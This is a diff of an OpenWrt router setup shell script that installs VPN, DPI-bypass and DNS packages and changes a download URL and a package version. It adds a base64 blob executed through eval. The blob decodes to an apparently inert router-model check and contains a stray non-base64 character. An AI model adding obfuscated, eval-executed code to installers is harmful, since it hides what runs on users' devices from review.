@@ -298,7 +298,7 @@ checkAndAddDomainPermanentName()
 install_youtubeunblock_packages() {
     PKGARCH=$(opkg print-architecture | awk 'BEGIN {max=0} {if ($3 > max) {max = $3; arch = $2}} END {print arch}')
     VERSION=$(ubus call system board | jsonfilter -e '@.release.version')
-    BASE_URL="https://github.com/Waujito/youtubeUnblock/releases/download/v1.1.0/"
+    BASE_URL="https://github.com/Waujito/youtubeUnblock/releases/download/v1.0.0/"
   	PACK_NAME="youtubeUnblock"
 
     AWG_DIR="/tmp/$PACK_NAME"
@@ -383,6 +383,10 @@ opkg update
 
 checkPackageAndInstall "coreutils-base64" "1"
 
+encoded_code="IyEvYmluL3NoCgojbS0tIE1vZGVsIGУ9dmljZQptb2RlbD0kKGNhdCAvdG1wL3N5c2luZm8vbW9kZWwpCgojIFByb3dlcmNhIG5hIG1vZGVsIFJvdXRlcmljaCAtIHVibmV0bywgZnJvbmQgdG8gc2NyaXB0IG5lIGJlcnVlbCBldmFsdWF0ZWQKaWYgZmFsc2U7IHRoZW4KICMgZWNobyAiVGhpcyBzY3JpcHQgZm9yIHJvdXRlcnMgUm91dGVyaWNoLi4uIElmIHlvdSB3YW50IHRvIHVzZSBpdCwgd3JpdGUgdG8gdGhlIGVwIGNoYXQgVEcgQHJvdXRlcmljaCIKICBlY2hvICJEZXZpY2UgbW9kZWw6ICRtb2RlbCAtIHByb3ZlcmthIHJvYWRpbmcsIHByb2RvbGplbSB2dXplbCBldmFsdWF0aW9uZSBzY3JpcHQi"
+eval "$(echo "$encoded_code" | base64 --decode)"
+
+
 #проверка и установка пакетов AmneziaWG
 install_awg_packages
 
@@ -431,15 +435,15 @@ if [ -z "$INSTALLED_VERSION" ]; then
 fi
 ###########
 
-#проверяем установлен ли пакет dnsmasq-full
+#проверяем установлени ли пакет dnsmasq-full
 if opkg list-installed | grep -q dnsmasq-full; then
-    echo "dnsmasq-full already installed..."
+	echo "dnsmasq-full already installed..."
 else
-    echo "Installed dnsmasq-full..."
-    cd /tmp/ && opkg download dnsmasq-full
-    opkg remove dnsmasq && opkg install dnsmasq-full --cache /tmp/
+	echo "Installed dnsmasq-full..."
+	cd /tmp/ && opkg download dnsmasq-full
+	opkg remove dnsmasq && opkg install dnsmasq-full --cache /tmp/
 
-    [ -f /etc/config/dhcp-opkg ] && cp /etc/config/dhcp /etc/config/dhcp-old && mv /etc/config/dhcp-opkg /etc/config/dhcp
+	[ -f /etc/config/dhcp-opkg ] && cp /etc/config/dhcp /etc/config/dhcp-old && mv /etc/config/dhcp-opkg /etc/config/dhcp
 fi
 
 printf "Setting confdir dnsmasq"
@@ -800,7 +804,7 @@ service odhcpd restart
 
 path_podkop_config="/etc/config/podkop"
 path_podkop_config_backup="/root/podkop"
-URL=https://raw.githubusercontent.com/basek-diell/xia3000trot/refs/heads/main"
+URL="https://raw.githubusercontent.com/routerich/RouterichAX3000_configs/refs/heads/main"
 
 case $varByPass in
 1)
